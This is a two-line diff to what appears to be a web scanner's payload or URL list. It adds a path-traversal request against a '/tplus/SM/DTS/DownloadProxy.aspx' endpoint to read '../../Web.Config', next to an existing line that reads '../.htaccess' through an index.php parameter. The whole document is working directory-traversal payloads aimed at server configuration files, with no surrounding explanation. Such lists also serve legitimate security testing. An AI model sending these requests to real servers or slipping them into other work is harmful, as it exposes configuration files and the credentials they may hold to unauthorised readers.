@@ -1,1 +1,2 @@
 /index.php?m=&c=M&a=index&type=../.htaccess
+/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config
